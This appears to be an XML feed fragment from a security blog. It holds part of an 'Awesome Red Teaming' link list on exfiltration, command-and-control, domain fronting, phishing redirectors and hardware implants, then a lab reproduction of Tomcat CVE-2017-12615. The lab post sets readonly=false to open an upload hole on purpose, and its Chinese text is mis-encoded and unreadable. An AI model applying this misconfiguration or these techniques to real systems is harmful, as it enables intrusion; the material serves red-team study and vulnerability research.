href="https://securityonline.info/sg1-swiss-army-knife-for-data-encryption-exfiltration-covert-communication/?utm_source=ReviveOldPost&amp;utm_medium=social&amp;utm_campaign=ReviveOldPost" target="_blank" rel="noopener">sg1: swiss army knife for data encryption, exfiltration &amp; covert communication</a></li><li><a href="https://n0where.net/data-exfiltration-over-dns-request-covert-channel-dnsexfiltrator" target="_blank" rel="noopener">Data Exfiltration over DNS Request Covert Channel: DNSExfiltrator</a></li><li><a href="https://github.com/PaulSec/DET" target="_blank" rel="noopener">DET (extensible) Data Exfiltration Toolkit</a></li><li><a href="https://www.notsosecure.com/data-exfiltration-formula-injection/" target="_blank" rel="noopener">Data Exfiltration via Formula Injection Part1</a></li></ul><h2 id="â†‘-Command-and-Control"><a href="#â†‘-Command-and-Control" class="headerlink" title="â†‘ Command and Control"></a><a href="#table-of-contents">â†‘</a> Command and Control</h2><h3 id="Domain-Fronting"><a href="#Domain-Fronting" class="headerlink" title="Domain Fronting"></a>Domain Fronting</h3><ul><li><a href="https://www.xorrior.com/Empire-Domain-Fronting/" target="_blank" rel="noopener">Empre Domain Fronting</a></li><li><a href="https://www.optiv.com/blog/escape-and-evasion-egressing-restricted-networks" target="_blank" rel="noopener">Escape and Evasion Egressing Restricted Networks - Tom Steele and Chris Patten</a></li><li><a href="https://github.com/rvrsh3ll/FindFrontableDomains" target="_blank" rel="noopener">Finding Frontable Domain</a></li><li><a href="https://www.mdsec.co.uk/2017/02/tor-fronting-utilising-hidden-services-for-privacy/" target="_blank" rel="noopener">TOR Fronting â€“ Utilising Hidden Services for Privacy</a></li><li><a href="https://www.securityartwork.es/2017/01/31/simple-domain-fronting-poc-with-gae-c2-server/" target="_blank" rel="noopener">Simple domain fronting PoC with GAE C2 server</a></li><li><a href="https://www.mdsec.co.uk/2017/02/domain-fronting-via-cloudfront-alternate-domains/" target="_blank" rel="noopener">Domain Fronting Via Cloudfront Alternate Domains</a></li><li><a href="https://theobsidiantower.com/2017/07/24/d0a7cfceedc42bdf3a36f2926bd52863ef28befc.html" target="_blank" rel="noopener">Finding Domain frontable Azure domains - thoth / Fionnbharr (@a_profligate)</a></li><li><a href="https://groups.google.com/forum/#!topic/traffic-obf/7ygIXCPebwQ" target="_blank" rel="noopener">Google Groups: Blog post on finding 2000+ Azure domains using Censys</a></li><li><a href="https://www.cyberark.com/threat-research-blog/red-team-insights-https-domain-fronting-google-hosts-using-cobalt-strike/" target="_blank" rel="noopener">Red Team Insights on HTTPS Domain Fronting Google Hosts Using Cobalt Strike</a></li><li><a href="http://www.rvrsh3ll.net/blog/offensive/ssl-domain-fronting-101/" target="_blank" rel="noopener">SSL Domain Fronting 101</a></li><li><a href="https://www.peew.pw/blog/2018/2/22/how-i-identified-93k-domain-frontable-cloudfront-domains" target="_blank" rel="noopener">How I Identified 93k Domain-Frontable CloudFront Domains</a></li><li><a href="https://medium.com/@vysec.private/validated-cloudfront-ssl-domains-27895822cea3" target="_blank" rel="noopener">Validated CloudFront SSL Domains</a></li><li><a href="https://www.mindpointgroup.com/blog/pen-test/cloudfront-hijacking/" target="_blank" rel="noopener">CloudFront Hijacking</a></li><li><a href="https://github.com/MindPointGroup/cloudfrunt" target="_blank" rel="noopener">CloudFrunt GitHub Repo</a></li></ul><h3 id="Connection-Proxy"><a href="#Connection-Proxy" class="headerlink" title="Connection Proxy"></a>Connection Proxy</h3><ul><li><a href="http://www.rvrsh3ll.net/blog/offensive/redirecting-cobalt-strike-dns-beacons/" target="_blank" rel="noopener">Redirecting Cobalt Strike DNS Beacons</a></li><li><a href="https://github.com/n0pe-sled/Apache2-Mod-Rewrite-Setup" target="_blank" rel="noopener">Apache2Mod Rewrite Setup</a></li><li><a href="https://bluescreenofjeff.com/2016-06-28-cobalt-strike-http-c2-redirectors-with-apache-mod_rewrite/" target="_blank" rel="noopener">Cobalt Strike HTTP C2 Redirectors with Apache mod_rewrite</a></li><li><a href="https://blog.cobaltstrike.com/2017/02/06/high-reputation-redirectors-and-domain-fronting/" target="_blank" rel="noopener">High-reputation Redirectors and Domain Fronting</a></li><li><a href="https://blog.cobaltstrike.com/2014/01/14/cloud-based-redirectors-for-distributed-hacking/" target="_blank" rel="noopener">Cloud-based Redirectors for Distributed Hacking</a></li><li><a href="https://bluescreenofjeff.com/2016-04-12-combatting-incident-responders-with-apache-mod_rewrite/" target="_blank" rel="noopener">Combatting Incident Responders with Apache mod_rewrite</a></li><li><a href="https://bluescreenofjeff.com/2016-04-05-operating-system-based-redirection-with-apache-mod_rewrite/" target="_blank" rel="noopener">Operating System Based Redirection with Apache mod_rewrite</a></li><li><a href="https://bluescreenofjeff.com/2016-03-29-invalid-uri-redirection-with-apache-mod_rewrite/" target="_blank" rel="noopener">Invalid URI Redirection with Apache mod_rewrite</a></li><li><a href="https://bluescreenofjeff.com/2016-03-22-strengthen-your-phishing-with-apache-mod_rewrite-and-mobile-user-redirection/" target="_blank" rel="noopener">Strengthen Your Phishing with Apache mod_rewrite and Mobile User Redirection</a></li><li><a href="https://gist.github.com/curi0usJack/971385e8334e189d93a6cb4671238b10" target="_blank" rel="noopener">mod_rewrite rule to evade vendor sandboxes</a></li><li><a href="https://bluescreenofjeff.com/2016-04-19-expire-phishing-links-with-apache-rewritemap/" target="_blank" rel="noopener">Expire Phishing Links with Apache RewriteMap</a></li><li><a href="https://gist.github.com/jivoi/a33ace2e25515a31aa2ffbae246d98c9" target="_blank" rel="noopener">Serving random payloads with NGINX</a></li><li><a href="https://blog.inspired-sec.com/archive/2017/04/17/Mod-Rewrite-Automatic-Setup.html" target="_blank" rel="noopener">Mod_Rewrite Automatic Setup</a></li><li><a href="https://zachgrace.com/2018/02/20/cobalt_strike_redirectors.html" target="_blank" rel="noopener">Hybrid Cobalt Strike Redirectors</a></li><li><a href="https://cybersyndicates.com/2017/04/expand-your-horizon-red-team/" target="_blank" rel="noopener">Expand Your Horizon Red Team â€“ Modern SAAS C2</a></li><li><a href="http://threat.tevora.com/automating-redirector-deployment-with-ansible/" target="_blank" rel="noopener">RTOps: Automating Redirector Deployment With Ansible</a></li></ul><h3 id="Web-Services"><a href="#Web-Services" class="headerlink" title="Web Services"></a>Web Services</h3><ul><li><a href="https://pentestlab.blog/2017/08/29/command-and-control-dropbox/" target="_blank" rel="noopener">C2 with Dropbox</a></li><li><a href="https://pentestlab.blog/2017/08/03/command-and-control-gmail/" target="_blank" rel="noopener">C2 with gmail</a></li><li><a href="https://pentestlab.blog/2017/09/26/command-and-control-twitter/" target="_blank" rel="noopener">C2 with twitter</a></li><li><a href="https://labs.mwrinfosecurity.com/blog/tasking-office-365-for-cobalt-strike-c2/" target="_blank" rel="noopener">Office 365 for Cobalt Strike C2</a></li><li><a href="https://www.cyberark.com/threat-research-blog/red-team-insights-https-domain-fronting-google-hosts-using-cobalt-strike/" target="_blank" rel="noopener">Red Team Insights on HTTPS Domain Fronting Google Hosts Using Cobalt Strike</a></li><li><a href="http://securityblog.gr/4434/a-stealthy-python-based-windows-backdoor-that-uses-github-as-a-cc-server/" target="_blank" rel="noopener">A stealthy Python based Windows backdoor that uses Github as a C&amp;C server</a></li><li><a href="https://www.cobaltstrike.com/help-externalc2" target="_blank" rel="noopener">External C2 (Third-Party Command and Control)</a></li><li><a href="https://outflank.nl/blog/2017/09/17/blogpost-cobalt-strike-over-external-c2-beacon-home-in-the-most-obscure-ways/" target="_blank" rel="noopener">Cobalt Strike over external C2 â€“ beacon home in the most obscure ways</a></li><li><a href="https://github.com/ryhanson/ExternalC2/" target="_blank" rel="noopener">External C2 for Cobalt Strike</a></li><li><a href="http://www.insomniacsecurity.com/2018/01/11/externalc2.html" target="_blank" rel="noopener">External C2 framework for Cobalt Strike</a></li><li><a href="https://github.com/Und3rf10w/external_c2_framework" target="_blank" rel="noopener">External C2 framework - GitHub Repo</a></li><li><a href="https://github.com/Und3rf10w/external_c2_framework" target="_blank" rel="noopener">Hiding in the Cloud: Cobalt Strike Beacon C2 using Amazon APIs</a></li><li><a href="https://blog.xpnsec.com/exploring-cobalt-strikes-externalc2-framework/" target="_blank" rel="noopener">Exploring Cobalt Strikeâ€™s ExternalC2 framework</a></li></ul><h3 id="Application-Layer-Protocol"><a href="#Application-Layer-Protocol" class="headerlink" title="Application Layer Protocol"></a>Application Layer Protocol</h3><ul><li><a href="https://pentestlab.blog/2017/12/06/command-and-control-websocket/" target="_blank" rel="noopener">C2 WebSocket</a></li><li><a href="https://pentestlab.blog/2017/11/20/command-and-control-wmi/" target="_blank" rel="noopener">C2 WMI</a></li><li><a href="https://pentestlab.blog/2017/11/14/command-and-control-website/" target="_blank" rel="noopener">C2 Website</a></li><li><a href="https://pentestlab.blog/2018/01/02/command-and-control-images/" target="_blank" rel="noopener">C2 Image</a></li><li><a href="https://pentestlab.blog/2018/01/08/command-and-control-javascript/" target="_blank" rel="noopener">C2 Javascript</a></li><li><a href="https://pentestlab.blog/2018/01/03/command-and-control-web-interface/" target="_blank" rel="noopener">C2 WebInterface</a></li><li><a href="https://pentestlab.blog/2017/09/06/command-and-control-dns/" target="_blank" rel="noopener">C2 with DNS</a></li><li><a href="https://pentestlab.blog/2017/10/04/command-and-control-https/" target="_blank" rel="noopener">C2 with https</a></li><li><a href="https://pentestlab.blog/2017/09/12/command-and-control-webdav/" target="_blank" rel="noopener">C2 with webdav</a></li><li><a href="https://medium.com/@Ne0nd0g/introducing-merlin-645da3c635a" target="_blank" rel="noopener">Introducing Merlinâ€Šâ€”â€ŠA cross-platform post-exploitation HTTP/2 Command &amp; Control Tool</a></li><li><a href="https://adapt-and-attack.com/2017/12/19/internetexplorer-application-for-c2/" target="_blank" rel="noopener">InternetExplorer.Application for C2</a></li></ul><h3 id="Infrastructure"><a href="#Infrastructure" class="headerlink" title="Infrastructure"></a>Infrastructure</h3><ul><li><a href="https://rastamouse.me/2017/08/automated-red-team-infrastructure-deployment-with-terraform---part-1/" target="_blank" rel="noopener">Automated Red Team Infrastructure Deployment with Terraform - Part 1</a></li><li><a href="https://rastamouse.me/2017/09/automated-red-team-infrastructure-deployment-with-terraform---part-2/" target="_blank" rel="noopener">Automated Red Team Infrastructure Deployment with Terraform - Part 2</a></li><li><a href="https://rastamouse.me/2018/02/red-team-infrastructure---aws-encrypted-ebs/" target="_blank" rel="noopener">Red Team Infrastructure - AWS Encrypted EBS</a></li><li><a href="https://cybersyndicates.com/2016/11/top-red-team-tips/" target="_blank" rel="noopener">6 RED TEAM INFRASTRUCTURE TIPS</a></li><li><a href="https://www.blackhillsinfosec.com/build-c2-infrastructure-digital-ocean-part-1/" target="_blank" rel="noopener">How to Build a C2 Infrastructure with Digital Ocean â€“ Part 1</a></li><li><a href="https://blog.cobaltstrike.com/2014/09/09/infrastructure-for-ongoing-red-team-operations/" target="_blank" rel="noopener">Infrastructure for Ongoing Red Team Operations</a></li><li><a href="https://posts.specterops.io/attack-infrastructure-log-aggregation-and-monitoring-345e4173044e" target="_blank" rel="noopener">Attack Infrastructure Log Aggregation and Monitoring</a></li><li><a href="https://bluescreenofjeff.com/2017-08-30-randomized-malleable-c2-profiles-made-easy/" target="_blank" rel="noopener">Randomized Malleable C2 Profiles Made Easy</a></li><li><a href="https://blog.cobaltstrike.com/2015/10/21/migrating-your-infrastructure/" target="_blank" rel="noopener">Migrating Your infrastructure</a></li><li><a href="https://pentestlab.blog/2017/07/28/command-and-control-icmp/" target="_blank" rel="noopener">ICMP C2</a></li><li><a href="https://arno0x0x.wordpress.com/2017/09/07/using-webdav-features-as-a-covert-channel/" target="_blank" rel="noopener">Using WebDAV features as a covert channel</a></li><li><a href="https://medium.com/@malcomvetter/safe-red-team-infrastructure-c5d6a0f13fac" target="_blank" rel="noopener">Safe Red Team Infrastructure</a></li><li><a href="https://cybersyndicates.com/2016/12/egressing-bluecoat-with-cobaltstike-letsencrypt/" target="_blank" rel="noopener">EGRESSING BLUECOAT WITH COBALTSTIKE &amp; LETâ€™S ENCRYPT</a></li><li><a href="http://www.harmj0y.net/blog/powershell/command-and-control-using-active-directory/" target="_blank" rel="noopener">Command and Control Using Active Directory</a></li><li><a href="https://blog.cobaltstrike.com/2013/02/12/a-vision-for-distributed-red-team-operations/" target="_blank" rel="noopener">A Vision for Distributed Red Team Operations</a></li><li><a href="https://bluescreenofjeff.com/2017-12-05-designing-effective-covert-red-team-attack-infrastructure/" target="_blank" rel="noopener">Designing Effective Covert Red Team Attack Infrastructure</a></li><li><a href="https://bluescreenofjeff.com/2017-06-13-serving-random-payloads-with-apache-mod_rewrite/" target="_blank" rel="noopener">Serving Random Payloads with Apache mod_rewrite</a></li><li><a href="https://blog.inspired-sec.com/archive/2017/02/14/Mail-Server-Setup.html" target="_blank" rel="noopener">Mail Servers Made Easy</a></li><li><a href="https://thevivi.net/2017/11/03/securing-your-empire-c2-with-apache-mod_rewrite/" target="_blank" rel="noopener">Securing your Empire C2 with Apache mod_rewrite</a></li><li><a href="https://jordan-wright.com/blog/post/2018-02-04-automating-gophish-releases/" target="_blank" rel="noopener">Automating Gophish Releases With Ansible and Docker</a></li><li><a href="https://bluescreenofjeff.com/2017-01-24-how-to-write-malleable-c2-profiles-for-cobalt-strike/" target="_blank" rel="noopener">How to Write Malleable C2 Profiles for Cobalt Strike</a></li><li><a href="https://bluescreenofjeff.com/2017-03-01-how-to-make-communication-profiles-for-empire/" target="_blank" rel="noopener">How to Make Communication Profiles for Empire</a></li><li><a href="http://www.harmj0y.net/blog/redteaming/a-brave-new-world-malleable-c2/" target="_blank" rel="noopener">A Brave New World: Malleable C2</a></li><li><a href="https://www.cobaltstrike.com/help-malleable-c2" target="_blank" rel="noopener">Malleable Command and Control</a></li></ul><h2 id="â†‘-Embedded-and-Peripheral-Devices-Hacking"><a href="#â†‘-Embedded-and-Peripheral-Devices-Hacking" class="headerlink" title="â†‘ Embedded and Peripheral Devices Hacking"></a><a href="#table-of-contents">â†‘</a> Embedded and Peripheral Devices Hacking</h2><ul><li><a href="https://www.trustwave.com/Resources/SpiderLabs-Blog/Getting-in-with-the-Proxmark-3-and-ProxBrute/" target="_blank" rel="noopener">Gettting in with the Proxmark3 &amp; ProxBrute</a></li><li><a href="https://blog.nviso.be/2017/01/11/a-practical-guide-to-rfid-badge-copying/" target="_blank" rel="noopener">Practical Guide to RFID Badge copying</a></li><li><a href="https://www.tunnelsup.com/contents-of-a-physical-pen-testers-backpack/" target="_blank" rel="noopener">Contents of a Physical Pentester Backpack</a></li><li><a href="https://github.com/samyk/magspoof" target="_blank" rel="noopener">MagSpoof - credit card/magstripe spoofer</a></li><li><a href="https://samy.pl/keysweeper/" target="_blank" rel="noopener">Wireless Keyboard Sniffer</a></li><li><a href="https://blog.kchung.co/rfid-hacking-with-the-proxmark-3/" target="_blank" rel="noopener">RFID Hacking with The Proxmark 3</a></li><li><a href="https://www.cs.bham.ac.uk/~garciaf/publications/Tutorial_Proxmark_the_Swiss_Army_Knife_for_RFID_Security_Research-RFIDSec12.pdf" target="_blank" rel="noopener">Swiss Army Knife for RFID</a></li><li><a href="https://media.blackhat.com/bh-us-12/Briefings/C_Miller/BH_US_12_Miller_NFC_attack_surface_WP.pdf" target="_blank" rel="noopener">Exploring NFC Attack Surface</a></li><li><a href="http://gerhard.dekoninggans.nl/documents/publications/dekoninggans.phd.thesis.pdf" target="_blank" rel="noopener">Outsmarting smartcards</a></li><li><a href="https://blog.kchung.co/reverse-engineering-hid-iclass-master-keys/" target="_blank" rel="noopener">Reverse engineering HID iClass Master keys</a></li><li><a href="https://www.pwnieexpress.com/aopp" target="_blank" rel="noopener">Android Open Pwn Project (AOPP)</a></li></ul><h2 id="â†‘-Misc"><a href="#â†‘-Misc" class="headerlink" title="â†‘ Misc"></a><a href="#table-of-contents">â†‘</a> Misc</h2><ul><li><a href="https://github.com/vysec/RedTips" target="_blank" rel="noopener">Red Tips of Vysec</a></li><li><a href="https://blog.cobaltstrike.com/2016/02/23/cobalt-strike-tips-for-2016-ccdc-red-teams/" target="_blank" rel="noopener">Cobalt Strike Tips for 2016 ccde red teams</a></li><li><a href="https://blog.cobaltstrike.com/2015/07/09/models-for-red-team-operations/" target="_blank" rel="noopener">Models for Red Team Operations</a></li><li><a href="https://github.com/magoo/redteam-plan" target="_blank" rel="noopener">Planning a Red Team exercise</a></li><li><a href="https://www.youtube.com/watch?v=oclbbqvawQg" target="_blank" rel="noopener">Raphael Mudge - Dirty Red Team tricks</a></li><li><a href="https://posts.specterops.io/introducing-the-adversary-resilience-methodology-part-one-e38e06ffd604" target="_blank" rel="noopener">introducing the adversary resilience methodology part 1</a></li><li><a href="https://posts.specterops.io/introducing-the-adversary-resilience-methodology-part-two-279a1ed7863d" target="_blank" rel="noopener">introducing the adversary resilience methodology part 2</a></li><li><a href="https://medium.com/@malcomvetter/responsible-red-teams-1c6209fd43cc" target="_blank" rel="noopener">Responsible red team</a></li><li><a href="https://bluescreenofjeff.com/2017-05-02-red-teaming-for-pacific-rim-ccdc-2017/" target="_blank" rel="noopener">Red Teaming for Pacific Rim CCDC 2017</a></li><li><a href="https://bluescreenofjeff.com/2015-04-15-how-i-prepared-to-red-team-at-prccdc-2015/" target="_blank" rel="noopener">How I Prepared to Red Team at PRCCDC 2015</a></li><li><a href="https://bluescreenofjeff.com/2016-05-24-pacific-rim-ccdc_2016/" target="_blank" rel="noopener">Red Teaming for Pacific Rim CCDC 2016</a></li><li><a href="https://medium.com/@malcomvetter/responsible-red-teams-1c6209fd43cc" target="_blank" rel="noopener">Responsible Red Teams</a></li></ul><h2 id="â†‘-RedTeam-Gadgets"><a href="#â†‘-RedTeam-Gadgets" class="headerlink" title="â†‘ RedTeam Gadgets"></a><a href="#table-of-contents">â†‘</a> RedTeam Gadgets</h2><h4 id="Network-Implants"><a href="#Network-Implants" class="headerlink" title="Network Implants"></a>Network Implants</h4><ul><li><a href="https://hackerwarehouse.com/product/lan-tap-pro/" target="_blank" rel="noopener">LAN Tap Pro</a></li><li><a href="https://hakshop.com/collections/network-implants/products/lan-turtle" target="_blank" rel="noopener">LAN Turtle</a></li><li><a href="https://hakshop.com/collections/physical-access/products/bash-bunny" target="_blank" rel="noopener">Bash Bunny</a></li><li><a href="https://hakshop.com/products/packet-squirrel" target="_blank" rel="noopener">Packet Squirrel</a><h4 id="Wifi-Auditing"><a href="#Wifi-Auditing" class="headerlink" title="Wifi Auditing"></a>Wifi Auditing</h4></li><li><a href="https://hakshop.com/products/wifi-pineapple" target="_blank" rel="noopener">WiFi Pineapple</a></li><li><a href="https://hackerwarehouse.com/product/alfa-802-11bgn-long-range-usb-wireless-adapter/" target="_blank" rel="noopener">Alpha Long range Wireless USB</a></li><li><a href="https://www.tindie.com/products/lspoplove/dstike-wifi-deauther-monster/" target="_blank" rel="noopener">Wifi-Deauth Monster</a></li><li><a href="https://www.amazon.com/gp/product/B00VYA3A2U/ref=as_li_tl" target="_blank" rel="noopener">Crazy PA</a><h4 id="IoT"><a href="#IoT" class="headerlink" title="IoT"></a>IoT</h4></li><li><a href="https://hackerwarehouse.com/product/blekey/" target="_blank" rel="noopener">BLE Key</a></li><li><a href="https://hackerwarehouse.com/product/proxmark3-kit/" target="_blank" rel="noopener">Proxmark3</a></li><li><a href="https://www.attify-store.com/products/zigbee-sniffing-tool-atmel-rzraven" target="_blank" rel="noopener">Zigbee Sniffer</a></li><li><a href="https://www.attify-store.com/collections/frontpage/products/jtag-exploitation-kit-with-lab-manual" target="_blank" rel="noopener">Attify IoT Exploit kit</a><h4 id="Software-Defined-Radio-SDR"><a href="#Software-Defined-Radio-SDR" class="headerlink" title="Software Defined Radio - SDR"></a>Software Defined Radio - SDR</h4></li><li><a href="https://hackerwarehouse.com/product/hackrf-one-kit/" target="_blank" rel="noopener">HackRF One Bundle</a></li><li><a href="https://hackerwarehouse.com/product/rtlsdr/" target="_blank" rel="noopener">RTL-SDR</a></li><li><a href="https://hackerwarehouse.com/product/yard-stick-one-kit/" target="_blank" rel="noopener">YARD stick one Bundle</a></li><li><a href="https://hackerwarehouse.com/product/ubertooth-one/" target="_blank" rel="noopener">Ubertooth</a><h4 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h4></li><li><a href="https://hackerwarehouse.com/product/keygrabber/" target="_blank" rel="noopener">Key Grabber</a></li><li><a href="https://store.ryscc.com/products/magspoof%20" target="_blank" rel="noopener">Magspoof</a></li><li><a href="https://samy.pl/poisontap/" target="_blank" rel="noopener">Poison tap</a></li><li><a href="https://samy.pl/keysweeper/" target="_blank" rel="noopener">keysweeper</a></li><li><a href="https://hakshop.com/collections/physical-access/products/usb-rubber-ducky-deluxe" target="_blank" rel="noopener">USB Rubber Ducky</a></li></ul><h2 id="â†‘-Ebooks"><a href="#â†‘-Ebooks" class="headerlink" title="â†‘ Ebooks"></a><a href="#table-of-contents">â†‘</a> Ebooks</h2><ul><li><a href="https://www.amazon.com/Next-Generation-Teaming-Henry-Dalziel/dp/0128041714" target="_blank" rel="noopener">Next Generation Red Teaming</a></li><li><a href="https://www.amazon.com/Targeted-Cyber-Attacks-Multi-staged-Exploits/dp/0128006048" target="_blank" rel="noopener">Targeted Cyber Attack</a></li><li><a href="https://www.amazon.com/Advanced-Penetration-Testing-Hacking-Networks/dp/1119367689" target="_blank" rel="noopener">Advanced Penetration Testing: Hacking the Worldâ€™s Most Secure Networks</a></li><li><a href="https://www.amazon.com/Social-Engineers-Playbook-Practical-Pretexting/dp/0692306617/" target="_blank" rel="noopener">Social Engieersâ€™ Playbook Pretical Pretexting</a></li></ul><h2 id="â†‘-Training-Free"><a href="#â†‘-Training-Free" class="headerlink" title="â†‘ Training ( Free )"></a><a href="#table-of-contents">â†‘</a> Training ( Free )</h2><ul><li><a href="https://www.youtube.com/watch?v=IRpS7oZ3z0o&amp;list=PL9HO6M_MU2nesxSmhJjEvwLhUoHPHmXvz" target="_blank" rel="noopener">Tradecraft - a course on red team operations</a></li><li><a href="https://blog.cobaltstrike.com/2015/09/30/advanced-threat-tactics-course-and-notes/" target="_blank" rel="noopener">Advanced Threat Tactics Course &amp; Notes</a></li></ul><h2 id="â†‘-Certification"><a href="#â†‘-Certification" class="headerlink" title="â†‘ Certification"></a><a href="#table-of-contents">â†‘</a> Certification</h2><ul><li><a href="http://www.crest-approved.org/examination/certified-simulated-attack-specialist/" target="_blank" rel="noopener">CREST Certified Simulated Attack Specialist</a></li><li><a href="http://www.crest-approved.org/examination/certified-simulated-attack-manager/" target="_blank" rel="noopener">CREST Certified Simulated Attack Manager</a></li><li><a href="https://www.sans.org/course/red-team-operations-and-threat-emulation" target="_blank" rel="noopener">SEC564: Red Team Operations and Threat Emulation</a></li><li><a href="https://www.elearnsecurity.com/course/penetration_testing_extreme/" target="_blank" rel="noopener">ELearn Security Penetration Testing eXtreme</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Awesome-Red-Teaming&quot;&gt;&lt;a href=&quot;#Awesome-Red-Teaming&quot; class=&quot;headerlink&quot; title=&quot;Awesome Red Teaming&quot;&gt;&lt;/a&gt;Awesome Red Teaming&lt;/h1&gt;&lt;p&gt;List of Awesome Red Team / Red Teaming Resources&lt;/p&gt;
&lt;p&gt;This list is for anyone wishing to learn about Red Teaming but do not have a starting point.&lt;/p&gt;
&lt;p&gt;Anyway, this is a living resources and will update regularly with latest Adversarial Tactics and Techniques based on &lt;a href=&quot;https://attack.mitre.org/wiki/Main_Page&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Mitre ATT&amp;amp;CK&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;You can help by sending Pull Requests to add more information.&lt;/p&gt;
    
    </summary>
    
      <category term="Tools" scheme="https://yaalonsong.github.io/categories/Tools/"/>
    
    
      <category term="Tools" scheme="https://yaalonsong.github.io/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2017-12615æ¼æ´å¤ç°</title>
    <link href="https://yaalonsong.github.io/2019/02/28/CVE-2017-12615.html"/>
    <id>https://yaalonsong.github.io/2019/02/28/CVE-2017-12615.html</id>
    <published>2019-02-28T09:49:30.333Z</published>
    <updated>2019-02-28T14:44:54.242Z</updated>
    
    <content type="html"><![CDATA[<h2 id="æ¼æ´åˆ©ç”¨æ¡ä»¶å’Œæ–¹å¼"><a href="#æ¼æ´åˆ©ç”¨æ¡ä»¶å’Œæ–¹å¼" class="headerlink" title="æ¼æ´åˆ©ç”¨æ¡ä»¶å’Œæ–¹å¼:"></a><strong>æ¼æ´åˆ©ç”¨æ¡ä»¶å’Œæ–¹å¼:</strong></h2><ul><li><p>CVE-2017-12615æ¼æ´åˆ©ç”¨éœ€è¦åœ¨Windowsç¯å¢ƒï¼Œä¸”éœ€è¦å°† readonly åˆå§‹åŒ–å‚æ•°ç”±é»˜è®¤å€¼è®¾ç½®ä¸º falseï¼Œç»è¿‡å®é™…æµ‹è¯•ï¼ŒTomcat 7.xç‰ˆæœ¬å†…web.xmlé…ç½®æ–‡ä»¶å†…é»˜è®¤é…ç½®æ— readonlyå‚æ•°ï¼Œéœ€è¦æ‰‹å·¥æ·»åŠ ï¼Œé»˜è®¤é…ç½®æ¡ä»¶ä¸‹ä¸å—æ­¤æ¼æ´å½±å“ã€‚</p><a id="more"></a></li></ul><p>CVE-2017-12616å½±å“èŒƒå›´ï¼šApache Tomcat 7.0.0 - 7.0.80</p><p>CVE-2017-12615å½±å“èŒƒå›´ï¼š Apache Tomcat 7.0.0 - 7.0.79</p><h2 id="å®‰è£…tomcat"><a href="#å®‰è£…tomcat" class="headerlink" title="å®‰è£…tomcat"></a>å®‰è£…tomcat</h2><p><img src="/uploads/tom1.png" alt=""></p><p><strong>U:test</strong></p><p><strong>P:test123</strong></p><p><img src="/uploads/tom2.png" alt=""></p><blockquote><p><strong>JAVA_HOME= C:\Program Files\Java\jdk1.7.0_25</strong></p><p><strong>CLASSPATH= .;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar;</strong></p><p><strong>Path=  %JAVA_HOME%/bin</strong></p></blockquote><p><strong>æ–°å¢2ä¸ªå˜é‡</strong></p><blockquote><p>CATALINA_HOME= tomcatè·¯å¾„</p><p>CATALINA_BASE= tomcatè·¯å¾„</p><p>CLASSPATH=;%TALINA_HOME%\common\lib\servlet.jar</p></blockquote><p>1ã€å¼€å§‹â€”-æ§åˆ¶é¢æ¿â€”-ç³»ç»Ÿå’Œå®‰å…¨â€”-windowsé˜²ç«å¢™â€”-é«˜çº§è®¾ç½®</p><p> 2ã€é€‰æ‹©â€œå…¥ç«™è§„åˆ™â€â€”-ç‚¹å‡»â€œæ–°å»ºè§„åˆ™â€â€”-â€œè§„åˆ™ç±»å‹â€é€‰æ‹©â€œç«¯å£â€â€”-â€œä¸‹ä¸€æ­¥â€â€”-è¯¥è§„åˆ™åº”ç”¨äºï¼Œé€‰æ‹©â€œTCPâ€â€”-â€œç‰¹å®šæœ¬åœ°ç«¯å£â€è¾“å…¥â€œ8080â€(Tomcatä½¿ç”¨çš„ç«¯å£)â€”-â€œä¸‹ä¸€æ­¥â€â€”-é€‰æ‹©â€œå…è®¸è¿æ¥â€ï¼Œç‚¹å‡»â€œä¸‹ä¸€æ­¥â€â€”-ä½•æ—¶åº”ç”¨è¯¥è§„åˆ™ï¼Œé»˜è®¤å…¨é€‰ï¼Œç‚¹å‡»â€œä¸‹ä¸€æ­¥â€â€”-ä¸ºè¯¥è§„åˆ™èµ·ä¸€ä¸ªåç§°ï¼Œå¦‚â€œTomcatå¼€æ”¾8080ç«¯å£â€â€”-ç‚¹å‡»â€œå®Œæˆâ€</p><p>3ã€Server.xml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;Connector port=&quot;8080&quot; protocol=&quot;HTTP/1.1&quot;</span><br><span class="line">connectionTimeout=&quot;20000&quot;</span><br><span class="line">redirectPort=&quot;8443&quot; address=&quot;0.0.0.0&quot; /&gt;</span><br></pre></td></tr></table></figure><p>C:\Program Files\Apache Software Foundation\Tomcat 7.0\conf\web.xml</p><p>å¢åŠ </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">   &lt;init-param&gt;</span><br><span class="line">   &lt;param-name&gt;readonly&lt;/param-name&gt;</span><br><span class="line"></span><br><span class="line">    &lt;param-value&gt;false&lt;/param-value&gt;</span><br><span class="line"></span><br><span class="line">&lt;/init-param&gt;</span><br></pre></td></tr></table></figure><p><img src="/uploads/tom3.png" alt=""></p><p><img src="/uploads/tom4.png" alt=""></p><p><img src="/uploads/tom5.png" alt=""></p><p><img src="/uploads/tom6.png" alt=""></p><p><img src="/uploads/tom7.png" alt=""></p><p><img src="/uploads/tom8.png" alt=""></p><p><img src="/uploads/tom9.png" alt=""></p><p><img src="/uploads/tom10.png" alt=""></p><blockquote><p>æç¤º 404ã€‚é€šè¿‡æè¿°ä¸­çš„ Windows å—å½±å“ï¼Œå¯ä»¥ç»“åˆ Windows çš„ç‰¹æ€§ã€‚å…¶ä¸€æ˜¯ NTFS æ–‡ä»¶æµï¼Œå…¶äºŒæ˜¯æ–‡ä»¶åçš„ç›¸å…³é™åˆ¶ï¼ˆå¦‚ Windows ä¸­æ–‡ä»¶åä¸èƒ½ä»¥ç©ºæ ¼ç»“å°¾ï¼‰æ¥ç»•è¿‡é™åˆ¶ï¼š</p></blockquote><p><img src="/uploads/tom11.png" alt=""></p><p><strong><em>7.0.81</em></strong></p><p><img src="/uploads/tom12.png" alt=""></p>]]></content>
    
    <summary type="html">
    
